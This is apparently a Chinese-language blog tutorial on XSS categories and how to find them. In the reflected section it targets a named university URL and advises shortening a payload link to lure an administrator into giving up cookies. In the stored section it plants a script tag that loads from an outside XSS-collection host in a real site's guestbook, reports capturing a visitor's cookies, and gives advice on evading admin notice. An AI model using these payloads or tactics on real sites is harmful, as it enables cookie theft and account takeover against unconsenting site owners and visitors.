# XSS分类与漏洞挖掘

![](/attackUsers/xss/image/xss-17.png)

---
## 01. 前言
当第一期出来的时候，反馈很好，但还是有很多人提出疑问，我这里就解答下。

```
问1：如果我输入PHP语句会不会执行。
答1：不会，因为XSS是面对前台的(用户可见部分)，而PHP则是后台处理(用户不可见部分)，如果可以执行PHP语句的话，那不叫XSS，叫"任意代码执行"。

问2：XSS和CSRF有什么区别么？
答2：有的，XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。

问3：为什么我在chrome浏览器下测试<script>alert("xss")</script>并没有成功。
答3：chrome内核与ie内核不一样，chrome的过滤机制比ie强。现在测试xss一般都拿能过chrome的为主，所以当你输入xss的时候，可能被chrome的过滤机制给过滤了。
```

## 02. 反射型XSS
反射XSS是XSS分类中最多的，他们原理是下面这样：

>Hacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短(可有可无，是为了增加迷惑性)——发送给受害人——受害打开后，执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等)

原理搞清楚，那就说说怎么挖掘吧.
现在市面上的软件(JSky、Safe3WVS、Netsparker等)都可以挖掘出反射XSS，但是想要那些更隐蔽的XSS还是需要手工的，我先使用软件挖掘一些反射XSS，然后介绍手工挖掘。

![](/attackUsers/xss/image/xss-18.png)

找到后，我们来打开

```
http://gdjy.hfut.edu.cn/viewcomp.jsp?id=hzgz123
```

打开后，我们试着在参数也就是id=hzgz123后面加上woaini(或则其他字符，这串字符必须保持唯一性，也就是说在整个网站里，他必须唯一一个不和其他字符相同的字符串)输入woaini后，打开，查看源代码(ctrl+u)，按下ctrl+f来搜索woaini字符串，看出现在哪个位置。

![](/attackUsers/xss/image/xss-19.png)

我们发现woaini字符在a标签的href属性里，那我们就可以根据这个环境来构造了，我们可以用`"></a><script>alert("xss")</script>`来先闭合掉a标签。然后再用script来运行js代码。也可以这样`onclick="alert(1)";>123</a>//`点击123触发onclick来运行js，然后把后面的内容来注释掉。构造好代码后，把url变成短连接，发送给管理员，诱惑管理员打开，就可以获取管理员的cookies了。

OK，软件挖XSS大致就这些，手工其实和这差不多，手工的话，记住一句话“`见框就插`、`改数据包不可见部分`、`改URL参数`、`js分析`”就可以了。改数据包、js分析比较深，现在我就不再阐述了，见框就插，大家应该都明白，** 找到一个input输入框，先输入唯一字符串，然后看源代码里有没有出现** ，再输入`<>""/&()`来看看过滤了哪些字符，根据过滤的字符，来构造xss。

下图是QQ空间一处反射XSS，因为是朋友给的，我也不清楚是否被提交，所以我就不放出了。

![](/attackUsers/xss/image/xss-20.png)

## 03 储蓄型XSS
PS：有的人叫持久型，各有各的叫法，所以不用太介意。

储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上。下面是我在某处网站上检测到的储蓄XSS，大家知道原理就OK。

目标站点：`http://www.*******.com/`

习惯性的打开留言处(book.asp)，点击留言(这里最好不要使用<script>alert("xss")</script>来测试是否存在XSS漏洞，容易被管理员发现，所以你可以使用<a></a>来测试，如果成功了，不会被管理员发现)OK，我先在留言里出输入<a>s</a>提交留言，F12打开审查元素，来看我们输入的标签是否被过滤了.

![](/attackUsers/xss/image/xss-21.png)

OK，发现没有过滤(如果`<a>s</a>`是彩色的说明没有过滤，如果是灰色就说明过滤了)

那我就在xss平台里创建一个项目，然后再次留言，里面写上，“`<script src="http://xss8.pw/EFe2Ga?1409273226"></script>`请问怎么报名啊”

![](/attackUsers/xss/image/xss-22.png)

名字是我乱起的，这样一来，只要你访问`http://www.******.com/book.asp`

就可以获取你的cookies，以及后台地址(因为留言板一般都在后台做审核)。但是，管理员好像死了，已经6天了，还没看。今天上xss平台一看有个cookies，看了下，是路人的，并不是管理员的。

![](/attackUsers/xss/image/xss-23.png)

但是使用方法大家也应该懂了。只要你打开 `http://www.******.com/book.asp` 我就会在第一时间获取你的cookies。

## 04. DOM XSS
DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，因为服务端对我们是不可见的

挖掘DOM XSS比较麻烦，因为有时你需要追源，对方可能会自定义函数，所以你需要一步一步来把对方自定义的函数来搞清楚。下面我举个最简单的例子：

在1.html里输入

```html
<script>
          document.write(document.URL.substring(document.URL.indexOf("a=")+2,document.URL.length));
</script>
```

在这里我先解释下上面的意思

```
Document.write  是把里面的内容写到页面里。
document.URL    是获取URL地址。
Substring       从某处到某处，把之间的内容获取。
document.URL.indexOf("a=")+2  是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值
document.URL.length  是获取当前URL的长度，同时也是substring的结束值。
```

合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来。
